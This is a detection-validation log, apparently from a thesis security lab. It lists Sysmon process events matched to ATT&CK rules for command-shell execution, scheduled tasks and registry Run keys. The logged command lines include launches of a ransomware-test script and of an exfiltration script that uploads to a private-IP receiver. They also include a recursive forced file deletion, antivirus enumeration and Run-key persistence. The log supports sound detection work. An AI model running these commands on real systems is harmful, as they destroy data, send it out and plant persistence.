2026-06-24T12:52:50.805Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P4	TEC-003	T1053.005	Scheduled Task operation detected - basic profile v2	CU003_Source_TEC003_ScheduledTask_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU003_Source_TEC003_ScheduledTask_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
